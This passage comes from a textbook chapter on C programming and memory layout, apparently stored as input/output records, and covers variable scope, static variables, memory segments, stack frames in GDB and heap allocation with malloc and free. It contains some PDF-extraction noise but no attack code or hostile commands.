setting j = 1337\\n\");\nj = 1337; // Writing to j\nfunc3();\nprintf(\"\\t\\t[back in func2] i = %d, j = %d\\n\", i, j);\n}\nvoid func1() {\nint i = 5;\nprintf(\"\\t[in func1] i = %d, j = %d\\n\", i, j);\nfunc2();\nprintf(\"\\t[back in func1] i = %d, j = %d\\n\", i, j);\n}\nint main() {\nint i = 3;\nprintf(\"[in main] i = %d, j = %d\\n\", i, j);\nfunc1();\nprintf(\"[back in main] i = %d, j = %d\\n\", i, j);\n}\nThe results of compiling and executing scope2.c are as follows.\nreader@hacking:~/booksrc $ gcc scope2.c\nreader@hacking:~/booksrc $ ./a.out\n[in main] i = 3, j = 42\nProgramming 63\n[in func1] i = 5, j = 42\n[in func2] i = 7, j = 42\n[in func2] setting j = 1337\n[in func3] i = 11, j = 999\n[back in func2] i = 7, j = 1337\n[back in func1] i = 5, j = 1337\n[back in main] i = 3, j = 1337\nreader@hacking:~/booksrc $\nIn the output, the global variable j is written to in func2(), and the\nchange persists in all functions except func3(), which has its own local\nvariable called j. In this case, the compiler prefers to use the local variable.\nWith all these variables using the same names, it can be a little confusing, but\nremember that in the end, it’s all just memory. The global variable j is just\nstored in memory, and every function is able to access that memory. The local\nvariables for each function are each stored in their own places in memory,\nregardless of the identical names. Printing the memory addresses of these\nvariables will give a clearer picture of what's going on. In the scope3.c example\ncode below, the variable addresses are printed using the unary address-of\noperator.\nscope3.c\n#include <stdio.h>\nint j = 42; // j is a global variable.\nvoid func3() {\nint i = 11, j = 999; // Here, j is a local variable of func3().\nprintf(\"\\t\\t\\t[in func3] i @ 0x%08x = %d\\n\", &i, i);\nprintf(\"\\t\\t\\t[in func3] j @ 0x%08x = %d\\n\", &j, j);\n}\nvoid func2() {\nint i = 7;\nprintf(\"\\t\\t[in func2] i @ 0x%08x = %d\\n\", &i, i);\nprintf(\"\\t\\t[in func2] j @ 0x%08x = %d\\n\", &j, j);\nprintf(\"\\t\\t[in func2] setting j = 1337\\n\");\nj = 1337; // Writing to j\nfunc3();\nprintf(\"\\t\\t[back in func2] i @ 0x%08x = %d\\n\", &i, i);\nprintf(\"\\t\\t[back in func2] j @ 0x%08x = %d\\n\", &j, j);\n}\nvoid func1() {\nint i = 5;\nprintf(\"\\t[in func1] i @ 0x%08x = %d\\n\", &i, i);\nprintf(\"\\t[in func1] j @ 0x%08x = %d\\n\", &j, j);\nfunc2();\nprintf(\"\\t[back in func1] i @ 0x%08x = %d\\n\", &i, i);\nprintf(\"\\t[back in func1] j @ 0x%08x = %d\\n\", &j, j);\n}\n64 0x200\nint main() {\nint i = 3;\nprintf(\"[in main] i @ 0x%08x = %d\\n\", &i, i);\nprintf(\"[in main] j @ 0x%08x = %d\\n\", &j, j);\nfunc1();\nprintf(\"[back in main] i @ 0x%08x = %d\\n\", &i, i);\nprintf(\"[back in main] j @ 0x%08x = %d\\n\", &j, j);\n}\nThe results of compiling and executing scope3.c are as follows.\nreader@hacking:~/booksrc $ gcc scope3.c\nreader@hacking:~/booksrc $ ./a.out\n[in main] i @ 0xbffff834 = 3\n[in main] j @ 0x08049988 = 42\n[in func1] i @ 0xbffff814 = 5\n[in func1] j @ 0x08049988 = 42\n[in func2] i @ 0xbffff7f4 = 7\n[in func2] j @ 0x08049988 = 42\n[in func2] setting j = 1337\n[in func3] i @ 0xbffff7d4 = 11\n[in func3] j @ 0xbffff7d0 = 999\n[back in func2] i @ 0xbffff7f4 = 7\n[back in func2] j @ 0x08049988 = 1337\n[back in func1] i @ 0xbffff814 = 5\n[back in func1] j @ 0x08049988 = 1337\n[back in main] i @ 0xbffff834 = 3\n[back in main] j @ 0x08049988 = 1337\nreader@hacking:~/booksrc $\nIn this output, it is obvious that the variable j used by func3() is different\nthan the j used by the other functions. The j used by func3() is located at\n0xbffff7d0, while the j used by the other functions is located at 0x08049988.\nAlso, notice that the variable i is actually a different memory address for each\nfunction.\nIn the following output, GDB is used to stop execution at a breakpoint in\nfunc3(). Then the backtrace command shows the record of each function call\non the stack.\nreader@hacking:~/booksrc $ gcc -g scope3.c\nreader@hacking:~/booksrc $ gdb -q ./a.out\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) list 1\n1 #include <stdio.h>\n2\n3 int j = 42; // j is a global variable.\n4\n5 void func3() {\n6 int i = 11, j = 999; // Here, j is a local variable of func3().\n7 printf(\"\\t\\t\\t[in func3] i @ 0x%08x = %d\\n\", &i, i);\n8 printf(\"\\t\\t\\t[in func3] j @ 0x%08x = %d\\n\", &j, j);\n9 }\nProgramming 65\n10\n(gdb) break 7\nBreakpoint 1 at 0x8048388: file scope3.c, line 7.\n(gdb) run\nStarting program: /home/reader/booksrc/a.out\n[in main] i @ 0xbffff804 = 3\n[in main] j @ 0x08049988 = 42\n[in func1] i @ 0xbffff7e4 = 5\n[in func1] j @ 0x08049988 = 42\n[in func2] i @ 0xbffff7c4 = 7\n[in func2] j @ 0x08049988 = 42\n[in func2] setting j = 1337\nBreakpoint 1, func3 () at scope3.c:7\n7 printf(\"\\t\\t\\t[in func3] i @ 0x%08x = %d\\n\", &i, i);\n(gdb) bt\n#0 func3 () at scope3.c:7\n#1 0x0804841d in func2 () at scope3.c:17\n#2 0x0804849f in func1 () at scope3.c:26\n#3 0x0804852b in main () at scope3.c:35\n(gdb)\nThe backtrace also shows the nested function calls by looking at records\nkept on the stack. Each time a function is called, a record called a stack frame\nis put on the stack. Each line in the backtrace corresponds to a stack frame.\nEach stack frame also contains the local variables for that context. The local\nvariables contained in each stack frame can be shown in GDB by adding the\nword full to the backtrace command.\n(gdb) bt full\n#0 func3 () at scope3.c:7\ni = 11\nj = 999\n#1 0x0804841d in func2 () at scope3.c:17\ni = 7\n#2 0x0804849f in func1 () at scope3.c:26\ni = 5\n#3 0x0804852b in main () at scope3.c:35\ni = 3\n(gdb)\nThe full backtrace clearly shows that the local variable j only exists in\nfunc3()’s context. The global version of the variable j is used in the other\nfunction’s contexts.\nIn addition to globals, variables can also be defined as static variables by\nprepending the keyword static to the variable definition. Similar to global\nvariables, a static variable remains intact between function calls; however, static\nvariables are also akin to local variables since they remain local within a par-\nticular function context. One different and unique feature of static variables\nis that they are only initialized once. The code in static.c will help explain\nthese concepts.\n66 0x200\nstatic.c\n#include <stdio.h>\nvoid function() { // An example function, with its own context\nint var = 5;\nstatic int static_var = 5; // Static variable initialization\nprintf(\"\\t[in function] var = %d\\n\", var);\nprintf(\"\\t[in function] static_var = %d\\n\", static_var);\nvar++; // Add one to var.\nstatic_var++; // Add one to static_var.\n}\nint main() { // The main function, with its own context\nint i;\nstatic int static_var = 1337; // Another static, in a different context\nfor(i=0; i < 5; i++) { // Loop 5 times.\nprintf(\"[in main] static_var = %d\\n\", static_var);\nfunction(); // Call the function.\n}\n}\nThe aptly named static_var is defined as a static variable in two places:\nwithin the context of main() and within the context of function(). Since static\nvariables are local within a particular functional context, these variables can\nhave the same name, but they actually represent two different locations in\nmemory. The function simply prints the values of the two variables in its con-\ntext and then adds 1 to both of them. Compiling and executing this code will\nshow the difference between the static and nonstatic variables.\nreader@hacking:~/booksrc $ gcc static.c\nreader@hacking:~/booksrc $ ./a.out\n[in main] static_var = 1337\n[in function] var = 5\n[in function] static_var = 5\n[in main] static_var = 1337\n[in function] var = 5\n[in function] static_var = 6\n[in main] static_var = 1337\n[in function] var = 5\n[in function] static_var = 7\n[in main] static_var = 1337\n[in function] var = 5\n[in function] static_var = 8\n[in main] static_var = 1337\n[in function] var = 5\n[in function] static_var = 9\nreader@hacking:~/booksrc $\nProgramming 67\nNotice that the static_var retains its value between subsequent calls to\nfunction(). This is because static variables retain their values, but also because\nthey are only initialized once. In addition, since the static variables are local\nto a particular functional context, the static_var in the context of main()\nretains its value of 1337 the entire time.\nOnce again, printing the addresses of these variables by dereferencing\nthem with the unary address operator will provide greater viability into what’s\nreally going on. Take a look at static2.c for an example.\nstatic2.c\n#include <stdio.h>\nvoid function() { // An example function, with its own context\nint var = 5;\nstatic int static_var = 5; // Static variable initialization\nprintf(\"\\t[in function] var @ %p = %d\\n\", &var, var);\nprintf(\"\\t[in function] static_var @ %p = %d\\n\", &static_var, static_var);\nvar++; // Add 1 to var.\nstatic_var++; // Add 1 to static_var.\n}\nint main() { // The main function, with its own context\nint i;\nstatic int static_var = 1337; // Another static, in a different context\nfor(i=0; i < 5; i++) { // loop 5 times\nprintf(\"[in main] static_var @ %p = %d\\n\", &static_var, static_var);\nfunction(); // Call the function.\n}\n}\nThe results of compiling and executing static2.c are as follows.\nreader@hacking:~/booksrc $ gcc static2.c\nreader@hacking:~/booksrc $ ./a.out\n[in main] static_var @ 0x804968c = 1337\n[in function] var @ 0xbffff814 = 5\n[in function] static_var @ 0x8049688 = 5\n[in main] static_var @ 0x804968c = 1337\n[in function] var @ 0xbffff814 = 5\n[in function] static_var @ 0x8049688 = 6\n[in main] static_var @ 0x804968c = 1337\n[in function] var @ 0xbffff814 = 5\n[in function] static_var @ 0x8049688 = 7\n[in main] static_var @ 0x804968c = 1337\n[in function] var @ 0xbffff814 = 5\n[in function] static_var @ 0x8049688 = 8\n[in main] static_var @ 0x804968c = 1337\n[in function] var @ 0xbffff814 = 5\n[in function] static_var @ 0x8049688 = 9\nreader@hacking:~/booksrc $\n68 0x200"
  },
  {
    "input": "0x270 Memory Segmentation",
    "output": "With the addresses of the variables displayed, it is apparent that the\nstatic_var in main() is different than the one found in function(), since they are\nlocated at different memory addresses (0x804968c and 0x8049688, respectively).\nYou may have noticed that the addresses of the local variables all have very\nhigh addresses, like 0xbffff814, while the global and static variables all have\nvery low memory addresses, like 0x0804968c and 0x8049688. That’s very astute\nof you—noticing details like this and asking why is one of the cornerstones of\nhacking. Read on for your answers.\n0x270 Memory Segmentation\nA compiled program’s memory is divided into five segments: text, data, bss,\nheap, and stack. Each segment represents a special portion of memory that is\nset aside for a certain purpose.\nThe text segment is also sometimes called the code segment. This is where\nthe assembled machine language instructions of the program are located.\nThe execution of instructions in this segment is nonlinear, thanks to the\naforementioned high-level control structures and functions, which compile\ninto branch, jump, and call instructions in assembly language. As a program\nexecutes, the EIP is set to the first instruction in the text segment. The\nprocessor then follows an execution loop that does the following:\n1. Reads the instruction that EIP is pointing to\n2. Adds the byte length of the instruction to EIP\n3. Executes the instruction that was read in step 1\n4. Goes back to step 1\nSometimes the instruction will be a jump or a call instruction, which\nchanges the EIP to a different address of memory. The processor doesn’t\ncare about the change, because it’s expecting the execution to be nonlinear\nanyway. If EIP is changed in step 3, the processor will just go back to step 1\nand read the instruction found at the address of whatever EIP was changed to.\nWrite permission is disabled in the text segment, as it is not used to store\nvariables, only code. This prevents people from actually modifying the pro-\ngram code; any attempt to write to this segment of memory will cause the\nprogram to alert the user that something bad happened, and the program\nwill be killed. Another advantage of this segment being read-only is that it\ncan be shared among different copies of the program, allowing multiple\nexecutions of the program at the same time without any problems. It should\nalso be noted that this memory segment has a fixed size, since nothing ever\nchanges in it.\nThe data and bss segments are used to store global and static program\nvariables. The data segment is filled with the initialized global and static variables,\nwhile the bss segment is filled with their uninitialized counterparts. Although\nthese segments are writable, they also have a fixed size. Remember that global\nvariables persist, despite the functional context (like the variable j in the\nprevious examples). Both global and static variables are able to persist\nbecause they are stored in their own memory segments.\nProgramming 69\nThe heap segment is a segment of memory a programmer can directly\ncontrol. Blocks of memory in this segment can be allocated and used for\nwhatever the programmer might need. One notable point about the heap\nsegment is that it isn’t of fixed size, so it can grow larger or smaller as needed.\nAll of the memory within the heap is managed by allocator and deallocator\nalgorithms, which respectively reserve a region of memory in the heap for\nuse and remove reservations to allow that portion of memory to be reused\nfor later reservations. The heap will grow and shrink depending on how\nmuch memory is reserved for use. This means a programmer using the heap\nallocation functions can reserve and free memory on the fly. The growth of\nthe heap moves downward toward higher memory addresses.\nThe stack segment also has variable size and is used as a temporary scratch\npad to store local function variables and context during function calls. This is\nwhat GDB’s backtrace command looks at. When a program calls a function,\nthat function will have its own set of passed variables, and the function’s code\nwill be at a different memory location in the text (or code) segment. Since\nthe context and the EIP must change when a function is called, the stack is\nused to remember all of the passed variables, the location the EIP should\nreturn to after the function is finished, and all the local variables used by\nthat function. All of this information is stored together on the stack in what is\ncollectively called a stack frame. The stack contains many stack frames.\nIn general computer science terms, a stack is an abstract data structure\nthat is used frequently. It has first-in, last-out (FILO) ordering, which means the\nfirst item that is put into a stack is the last item to come out of it. Think of it\nas putting beads on a piece of string that has a knot on one end—you can’t\nget the first bead off until you have removed all the other beads. When an\nitem is placed into a stack, it’s known as pushing, and when an item is removed\nfrom a stack, it’s called popping.\nAs the name implies, the stack segment of memory is, in fact, a stack data\nstructure, which contains stack frames. The ESP register is used to keep track\nof the address of the end of the stack, which is constantly changing as items\nare pushed into and popped off of it. Since this is very dynamic behavior, it\nmakes sense that the stack is also not of a fixed size. Opposite to the dynamic\ngrowth of the heap, as the stack changes in size, it grows upward in a visual\nlisting of memory, toward lower memory addresses.\nThe FILO nature of a stack might seem odd, but since the stack is used\nto store context, it’s very useful. When a function is called, several things are\npushed to the stack together in a stack frame. The EBP register—sometimes\ncalled the frame pointer (FP) or local base (LB) pointer—is used to reference local\nfunction variables in the current stack frame. Each stack frame contains the\nparameters to the function, its local variables, and two pointers that are nec-\nessary to put things back the way they were: the saved frame pointer (SFP) and\nthe return address. The SFP is used to restore EBP to its previous value, and the\nreturn address is used to restore EIP to the next instruction found after the\nfunction call. This restores the functional context of the previous stack\nframe.\n70 0x200\nThe following stack_example.c code has two functions: main() and\ntest_function().\nstack_example.c\nvoid test_function(int a, int b, int c, int d) {\nint flag;\nchar buffer[10];\nflag = 31337;\nbuffer[0] = 'A';\n}\nint main() {\ntest_function(1, 2, 3, 4);\n}\nThis program first declares a test function that has four arguments, which\nare all declared as integers: a, b, c, and d. The local variables for the function\ninclude a single character called flag and a 10-character buffer called buffer.\nThe memory for these variables is in the stack segment, while the machine\ninstructions for the function’s code is stored in the text segment. After\ncompiling the program, its inner workings can be examined with GDB. The\nfollowing output shows the disassembled machine instructions for main() and\ntest_function(). The main() function starts at 0x08048357 and test_function()\nstarts at 0x08048344. The first few instructions of each function (shown in\nbold below) set up the stack frame. These instructions are collectively called\nthe procedure prologue or function prologue. They save the frame pointer on the\nstack, and they save stack memory for the local function variables. Sometimes\nthe function prologue will handle some stack alignment as well. The exact\nprologue instructions will vary greatly depending on the compiler and\ncompiler options, but in general these instructions build the stack frame.\nreader@hacking:~/booksrc $ gcc -g stack_example.c\nreader@hacking:~/booksrc $ gdb -q ./a.out\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) disass main\nDump of assembler code for function main():\n0x08048357 <main+0>: push ebp\n0x08048358 <main+1>: mov ebp,esp\n0x0804835a <main+3>: sub esp,0x18\n0x0804835d <main+6>: and esp,0xfffffff0\n0x08048360 <main+9>: mov eax,0x0\n0x08048365 <main+14>: sub esp,eax\n0x08048367 <main+16>: mov DWORD PTR [esp+12],0x4\n0x0804836f <main+24>: mov DWORD PTR [esp+8],0x3\n0x08048377 <main+32>: mov DWORD PTR [esp+4],0x2\n0x0804837f <main+40>: mov DWORD PTR [esp],0x1\n0x08048386 <main+47>: call 0x8048344 <test_function>\n0x0804838b <main+52>: leave\n0x0804838c <main+53>: ret\nProgramming 71\nEnd of assembler dump\n(gdb) disass test_function()\nDump of assembler code for function test_function:\n0x08048344 <test_function+0>: push ebp\n0x08048345 <test_function+1>: mov ebp,esp\n0x08048347 <test_function+3>: sub esp,0x28\n0x0804834a <test_function+6>: mov DWORD PTR [ebp-12],0x7a69\n0x08048351 <test_function+13>: mov BYTE PTR [ebp-40],0x41\n0x08048355 <test_function+17>: leave\n0x08048356 <test_function+18>: ret\nEnd of assembler dump\n(gdb)\nWhen the program is run, the main() function is called, which simply calls\ntest_function().\nWhen the test_function() is called from the main() function, the various\nvalues are pushed to the stack to create the start of the stack frame as follows.\nWhen test_function() is called, the function arguments are pushed onto the\nstack in reverse order (since it’s FILO). The arguments for the function are\n1, 2, 3, and 4, so the subsequent push instructions push 4, 3, 2, and finally 1\nonto the stack. These values correspond to the variables d, c, b, and a in the\nfunction. The instructions that put these values on the stack are shown in\nbold in the main() function’s disassembly below.\n(gdb) disass main\nDump of assembler code for function main:\n0x08048357 <main+0>: push ebp\n0x08048358 <main+1>: mov ebp,esp\n0x0804835a <main+3>: sub esp,0x18\n0x0804835d <main+6>: and esp,0xfffffff0\n0x08048360 <main+9>: mov eax,0x0\n0x08048365 <main+14>: sub esp,eax\n0x08048367 <main+16>: mov DWORD PTR [esp+12],0x4\n0x0804836f <main+24>: mov DWORD PTR [esp+8],0x3\n0x08048377 <main+32>: mov DWORD PTR [esp+4],0x2\n0x0804837f <main+40>: mov DWORD PTR [esp],0x1\n0x08048386 <main+47>: call 0x8048344 <test_function>\n0x0804838b <main+52>: leave\n0x0804838c <main+53>: ret\nEnd of assembler dump\n(gdb)\nNext, when the assembly call instruction is executed, the return\naddress is pushed onto the stack and the execution flow jumps to the start of\ntest_function() at 0x08048344. The return address value will be the location\nofthe instruction following the current EIP—specifically, the value stored\nduring step 3 of the previously mentioned execution loop. In this case, the\nreturn address would point to the leave instruction in main() at 0x0804838b.\nThe call instruction both stores the return address on the stack and jumps\nEIP to the beginning of test_function(), so test_function()’s procedure pro-\nlogue instructions finish building the stack frame. In this step, the current\nvalue of EBP is pushed to the stack. This value is called the saved frame\n72 0x200\npointer (SFP) and is later used to restore EBP back to its original state.\nThecurrent value of ESP is then copied into EBP to set the new frame pointer.\nThis frame pointer is used to reference the local variables of the function\n(flag and buffer). Memory is saved for these variables by subtracting from\nESP. In the end, the stack frame looks something like this:\nTop of the Stack\nLow addresses\nbuffer\nflag\nSaved frame pointer (SFP)\nFrame pointer (EBP)\nReturn address (ret)\na\nb\nc\nd\nHigh addresses\nWe can watch the stack frame construction on the stack using GDB. In the\nfollowing output, a breakpoint is set in main() before the call to test_function()\nand also at the beginning of test_function(). GDB will put the first break-\npoint before the function arguments are pushed to the stack, and the second\nbreakpoint after test_function()’s procedure prologue. When the program is\nrun, execution stops at the breakpoint, where the register’s ESP (stack pointer),\nEBP (frame pointer), and EIP (execution pointer) are examined.\n(gdb) list main\n4\n5 flag = 31337;\n6 buffer[0] = 'A';\n7 }\n8\n9 int main() {\n10 test_function(1, 2, 3, 4);\n11 }\n(gdb) break 10\nBreakpoint 1 at 0x8048367: file stack_example.c, line 10.\n(gdb) break test_function\nBreakpoint 2 at 0x804834a: file stack_example.c, line 5.\n(gdb) run\nStarting program: /home/reader/booksrc/a.out\nBreakpoint 1, main () at stack_example.c:10\n10 test_function(1, 2, 3, 4);\n(gdb) i r esp ebp eip\nesp 0xbffff7f0 0xbffff7f0\nebp 0xbffff808 0xbffff808\neip 0x8048367 0x8048367 <main+16>\n(gdb) x/5i $eip\n0x8048367 <main+16>: mov DWORD PTR [esp+12],0x4\nProgramming 73\n0x804836f <main+24>: mov DWORD PTR [esp+8],0x3\n0x8048377 <main+32>: mov DWORD PTR [esp+4],0x2\n0x804837f <main+40>: mov DWORD PTR [esp],0x1\n0x8048386 <main+47>: call 0x8048344 <test_function>\n(gdb)\nThis breakpoint is right before the stack frame for the test_function() call\nis created. This means the bottom of this new stack frame is at the current\nvalue of ESP, 0xbffff7f0. The next breakpoint is right after the procedure\nprologue for test_function(), so continuing will build the stack frame. The\noutput below shows similar information at the second breakpoint. The local\nvariables (flag and buffer) are referenced relative to the frame pointer (EBP).\n(gdb) cont\nContinuing.\nBreakpoint 2, test_function (a=1, b=2, c=3, d=4) at stack_example.c:5\n5 flag = 31337;\n(gdb) i r esp ebp eip\nesp 0xbffff7c0 0xbffff7c0\nebp 0xbffff7e8 0xbffff7e8\neip 0x804834a 0x804834a <test_function+6>\n(gdb) disass test_function\nDump of assembler code for function test_function:\n0x08048344 <test_function+0>: push ebp\n0x08048345 <test_function+1>: mov ebp,esp\n0x08048347 <test_function+3>: sub esp,0x28\n0x0804834a <test_function+6>: mov DWORD PTR [ebp-12],0x7a69\n0x08048351 <test_function+13>: mov BYTE PTR [ebp-40],0x41\n0x08048355 <test_function+17>: leave\n0x08048356 <test_function+18>: ret\nEnd of assembler dump.\n(gdb) print $ebp-12\n$1 = (void *) 0xbffff7dc\n(gdb) print $ebp-40\n$2 = (void *) 0xbffff7c0\n(gdb) x/16xw $e(cid:0)sp\n0xbffff7c0: 0x00000000 0x08049548 0xbffff7d8 0x08048249\n0xbffff7d0: 0xb7f9f729 (cid:2) 0xb7fd6ff4 (cid:3) 0xbffff808 (cid:4) 0x080483b9\n0xbffff7e0: (cid:5) 0xb7fd6ff4 0xbffff89c 0xbffff808 0x0804838b\n0xbffff7f0: 0x00000001 0x00000002 0x00000003 0x00000004\n(gdb)\nThe stack frame is shown on the stack at the end. The(cid:0) four arguments to\nthe function can be seen at the b(cid:2)ottom of the stack frame ( ), with the return\naddress fou(cid:3)nd directly on top ( ). Above that is the saved frame pointer of\n0xbffff808 ( ), which is what EBP was in the previous stack frame. The rest of\nthe memory is saved for the local stack variables: flag and buffer. Calculat-\ning their relative addresses to EBP show their ex(cid:4)act locations in the stack\nframe. Memory for the flag(cid:5) variable is shown at and memory for the\nbuffer variable is shown at . The extra space in the stack frame is just\npadding.\n74 0x200"
  },
  {
    "input": "0x271 Memory Segments in C",
    "output": "After the execution finishes, the entire stack frame is popped off of the\nstack, and the EIP is set to the return address so the program can continue\nexecution. If another function was called within the function, another stack\nframe would be pushed onto the stack, and so on. As each function ends, its\nstack frame is popped off of the stack so execution can be returned to the\nprevious function. This behavior is the reason this segment of memory is\norganized in a FILO data structure.\nThe various segments of memory are arranged in the order they\nwerepresented, from the lower memory addresses to the higher memory\naddresses. Since most people are familiar with seeing numbered lists that\ncount downward, the smaller memory addresses are shown at the top.\nSome texts have this reversed, which can be very confusing; so for this\nbook, smaller memory addresses\narealways shown at the top. Most Low addresses Text (code) segment\ndebuggers also display memory in\nData segment\nthis style, with the smaller memory\naddresses at the top and the higher bss segment\nones at the bottom. Heap segment\nSince the heap and the stack\nThe heap grows\nare both dynamic, they both grow down toward\nhigher memory\nin different directions toward each addresses.\nother. This minimizes wasted space,\nThe stack grows\nallowing the stack to be larger if the up toward lower\nmemory addresses.\nheap is small and vice versa.\nStack segment\nHigh addresses\n0x271 Memory Segments in C\nIn C, as in other compiled languages, the compiled code goes into the text\nsegment, while the variables reside in the remaining segments. Exactly which\nmemory segment a variable will be stored in depends on how the variable is\ndefined. Variables that are defined outside of any functions are considered\nto be global. The static keyword can also be prepended to any variable\ndeclaration to make the variable static. If static or global variables are initial-\nized with data, they are stored in the data memory segment; otherwise, these\nvariables are put in the bss memory segment. Memory on the heap memory\nsegment must first be allocated using a memory allocation function called\nmalloc(). Usually, pointers are used to reference memory on the heap.\nFinally, the remaining function variables are stored in the stack memory\nsegment. Since the stack can contain many different stack frames, stack\nvariables can maintain uniqueness within different functional contexts.\nThe memory_segments.c program will help explain these concepts in C.\nmemory_segments.c\n#include <stdio.h>\nint global_var;\nProgramming 75\nint global_initialized_var = 5;\nvoid function() { // This is just a demo function.\nint stack_var; // Notice this variable has the same name as the one in main().\nprintf(\"the function's stack_var is at address 0x%08x\\n\", &stack_var);\n}\nint main() {\nint stack_var; // Same name as the variable in function()\nstatic int static_initialized_var = 5;\nstatic int static_var;\nint *heap_var_ptr;\nheap_var_ptr = (int *) malloc(4);\n// These variables are in the data segment.\nprintf(\"global_initialized_var is at address 0x%08x\\n\", &global_initialized_var);\nprintf(\"static_initialized_var is at address 0x%08x\\n\\n\", &static_initialized_var);\n// These variables are in the bss segment.\nprintf(\"static_var is at address 0x%08x\\n\", &static_var);\nprintf(\"global_var is at address 0x%08x\\n\\n\", &global_var);\n// This variable is in the heap segment.\nprintf(\"heap_var is at address 0x%08x\\n\\n\", heap_var_ptr);\n// These variables are in the stack segment.\nprintf(\"stack_var is at address 0x%08x\\n\", &stack_var);\nfunction();\n}\nMost of this code is fairly self-explanatory because of the descriptive\nvariable names. The global and static variables are declared as described\nearlier, and initialized counterparts are also declared. The stack variable is\ndeclared both in main() and in function() to showcase the effect of functional\ncontexts. The heap variable is actually declared as an integer pointer, which\nwill point to memory allocated on the heap memory segment. The malloc()\nfunction is called to allocate four bytes on the heap. Since the newly allocated\nmemory could be of any data type, the malloc() function returns a void\npointer, which needs to be typecast into an integer pointer.\nreader@hacking:~/booksrc $ gcc memory_segments.c\nreader@hacking:~/booksrc $ ./a.out\nglobal_initialized_var is at address 0x080497ec\nstatic_initialized_var is at address 0x080497f0\nstatic_var is at address 0x080497f8\nglobal_var is at address 0x080497fc\nheap_var is at address 0x0804a008\n76 0x200"
  },
  {
    "input": "0x272 Using the Heap",
    "output": "stack_var is at address 0xbffff834\nthe function's stack_var is at address 0xbffff814\nreader@hacking:~/booksrc $\nThe first two initialized variables have the lowest memory addresses,\nsince they are located in the data memory segment. The next two variables,\nstatic_var and global_var, are stored in the bss memory segment, since they\naren’t initialized. These memory addresses are slightly larger than the previous\nvariables’ addresses, since the bss segment is located below the data segment.\nSince both of these memory segments have a fixed size after compilation,\nthere is little wasted space, and the addresses aren’t very far apart.\nThe heap variable is stored in space allocated on the heap segment,\nwhich is located just below the bss segment. Remember that memory in this\nsegment isn’t fixed, and more space can be dynamically allocated later. Finally,\nthe last two stack_vars have very large memory addresses, since they are located\nin the stack segment. Memory in the stack isn’t fixed, either; however, this\nmemory starts at the bottom and grows backward toward the heap segment.\nThis allows both memory segments to be dynamic without wasting space in\nmemory. The first stack_var in the main() function’s context is stored in the\nstack segment within a stack frame. The second stack_var in function() has its\nown unique context, so that variable is stored within a different stack frame\nin the stack segment. When function() is called near the end of the program,\na new stack frame is created to store (among other things) the stack_var for\nfunction()’s context. Since the stack grows back up toward the heap segment\nwith each new stack frame, the memory address for the second stack_var\n(0xbffff814) is smaller than the address for the first stack_var (0xbffff834)\nfound within main()’s context.\n0x272 Using the Heap\nUsing the other memory segments is simply a matter of how you declare\nvariables. However, using the heap requires a bit more effort. As previously\ndemonstrated, allocating memory on the heap is done using the malloc()\nfunction. This function accepts a size as its only argument and reserves that\nmuch space in the heap segment, returning the address to the start of this\nmemory as a void pointer. If the malloc() function can’t allocate memory\nfor some reason, it will simply return a NULL pointer with a value of 0.\nThe corresponding deallocation function is free(). This function accepts a\npointer as its only argument and frees that memory space on the heap so it\ncan be used again later. These relatively simple functions are demonstrated\nin heap_example.c.\nheap_example.c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nProgramming 77\nint main(int argc, char *argv[]) {\nchar *char_ptr; // A char pointer\nint *int_ptr; // An integer pointer\nint mem_size;\nif (argc < 2) // If there aren't command-line arguments,\nmem_size = 50; // use 50 as the default value.\nelse\nmem_size = atoi(argv[1]);\nprintf(\"\\t[+] allocating %d bytes of memory on the heap for char_ptr\\n\", mem_size);\nchar_ptr = (char *) malloc(mem_size); // Allocating heap memory\nif(char_ptr == NULL) { // Error checking, in case malloc() fails\nfprintf(stderr, \"Error: could not allocate heap memory.\\n\");\nexit(-1);\n}\nstrcpy(char_ptr, \"This is memory is located on the heap.\");\nprintf(\"char_ptr (%p) --> '%s'\\n\", char_ptr, char_ptr);\nprintf(\"\\t[+] allocating 12 bytes of memory on the heap for int_ptr\\n\");\nint_ptr = (int *) malloc(12); // Allocated heap memory again\nif(int_ptr == NULL) { // Error checking, in case malloc() fails\nfprintf(stderr, \"Error: could not allocate heap memory.\\n\");\nexit(-1);\n}\n*int_ptr = 31337; // Put the value of 31337 where int_ptr is pointing.\nprintf(\"int_ptr (%p) --> %d\\n\", int_ptr, *int_ptr);\nprintf(\"\\t[-] freeing char_ptr's heap memory...\\n\");\nfree(char_ptr); // Freeing heap memory\nprintf(\"\\t[+] allocating another 15 bytes for char_ptr\\n\");\nchar_ptr = (char *) malloc(15); // Allocating more heap memory\nif(char_ptr == NULL) { // Error checking, in case malloc() fails\nfprintf(stderr, \"Error: could not allocate heap memory.\\n\");\nexit(-1);\n}\nstrcpy(char_ptr, \"new memory\");\nprintf(\"char_ptr (%p) --> '%s'\\n\", char_ptr, char_ptr);\nprintf(\"\\t[-] freeing int_ptr's heap memory...\\n\");\nfree(int_ptr); // Freeing heap memory\nprintf(\"\\t[-] freeing char_ptr's heap memory...\\n\");\nfree(char_ptr); // Freeing the other block of heap memory\n}\n78 0x200\nThis program accepts a command-line argument for the size of the first\nmemory allocation, with a default value of 50. Then it uses the malloc() and\nfree() functions to allocate and deallocate memory on the heap. There are\nplenty of printf() statements to debug what is actually happening when the\nprogram is executed. Since malloc() doesn’t know what type of memory it’s\nallocating, it returns a void pointer to the newly allocated heap memory,\nwhich must be typecast into the appropriate type. After every malloc() call,\nthere is an error-checking block that checks whether or not the allocation\nfailed. If the allocation fails and the pointer is NULL, fprintf() is used to\nprint an error message to standard error and the program exits. The fprintf()\nfunction is very similar to printf(); however, its first argument is stderr, which\nis a standard filestream meant for displaying errors. This function will be\nexplained more later, but for now, it’s just used as a way to properly display\nan error. The rest of the program is pretty straightforward.\nreader@hacking:~/booksrc $ gcc -o heap_example heap_example.c\nreader@hacking:~/booksrc $ ./heap_example\n[+] allocating 50 bytes of memory on the heap for char_ptr\nchar_ptr (0x804a008) --> 'This is memory is located on the heap.'\n[+] allocating 12 bytes of memory on the heap for int_ptr\nint_ptr (0x804a040) --> 31337\n[-] freeing char_ptr's heap memory...\n[+] allocating another 15 bytes for char_ptr\nchar_ptr (0x804a050) --> 'new memory'\n[-] freeing int_ptr's heap memory...\n[-] freeing char_ptr's heap memory...\nreader@hacking:~/booksrc $\nIn the preceding output, notice that each block of memory has an incre-\nmentally higher memory address in the heap. Even though the first 50 bytes\nwere deallocated, when 15 more bytes are requested, they are put after the\n12 bytes allocated for the 